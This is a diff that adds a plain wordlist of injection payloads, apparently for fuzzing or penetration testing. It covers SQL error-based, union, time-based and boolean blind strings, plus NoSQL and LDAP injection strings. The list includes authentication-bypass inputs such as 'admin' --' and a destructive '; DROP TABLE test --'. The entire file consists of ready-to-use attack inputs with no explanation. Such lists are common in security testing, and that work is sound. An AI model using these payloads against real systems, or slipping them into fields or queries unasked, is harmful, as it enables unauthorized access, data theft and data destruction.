@@ -1,0 +1,40 @@
+# SQL Injection Payloads
+# Error-based
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1' --
+" OR "1"="1" --
+' OR 1=1 --
+' OR 1=1 #
+admin' --
+' UNION SELECT NULL --
+' UNION SELECT NULL, NULL --
+' UNION SELECT NULL, NULL, NULL --
+1' ORDER BY 1 --
+1' ORDER BY 10 --
+'; DROP TABLE test --
+1 OR 1=1
+1' AND '1'='1
+1' AND '1'='2
+# Time-based blind
+' OR SLEEP(5) --
+' OR pg_sleep(5) --
+'; WAITFOR DELAY '0:0:5' --
+1' AND SLEEP(5) --
+# Boolean blind
+' AND 1=1 --
+' AND 1=2 --
+# NoSQL injection
+{"$gt": ""}
+{"$ne": ""}
+' || '1'=='1
+'; return true; var a='
+# LDAP injection
+*
+*)(&
+*)(|
+*()|&'
+admin)(&)
+admin)(|(password=*))
